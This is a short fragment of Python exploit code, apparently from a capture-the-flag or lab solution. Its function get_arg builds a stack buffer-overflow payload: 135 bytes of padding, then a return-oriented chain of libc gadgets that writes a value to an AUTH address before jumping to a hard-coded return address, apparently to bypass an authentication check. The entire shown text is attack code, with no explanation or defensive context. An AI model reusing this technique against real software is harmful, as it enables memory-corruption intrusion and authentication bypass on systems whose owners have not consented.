...
def get_arg() -> bytes:
   ...
   pop_eax = libc_search.find('pop eax')
   mov_eax = libc_search.find('mov DWORD PTR [eax], ecx')
   original_ra = 0x080488b0
   buffer_offset = 135 * b'A'
   payload = buffer_offset + struct.pack('<IIII', pop_eax, addresses.AUTH, mov_eax, original_ra)
   return payload
